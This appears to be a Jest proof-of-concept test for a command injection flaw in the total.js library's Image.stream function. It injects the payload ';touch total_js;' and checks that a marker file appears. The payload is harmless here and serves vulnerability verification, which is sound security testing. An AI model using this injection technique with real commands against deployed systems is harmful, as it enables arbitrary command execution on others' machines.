test("Command Injection in total.js", (done) => {
  expect.assertions(2);
  const total = require("total.js");
  const fs = require("fs");
  const path = "./total_js";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = Image.load("");
  let payload = ";touch total_js;";
  var timetaken = "Time taken by addCount function";
  console.time(timetaken);
  image.stream(payload);
  console.timeEnd(timetaken);
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 1000);
});
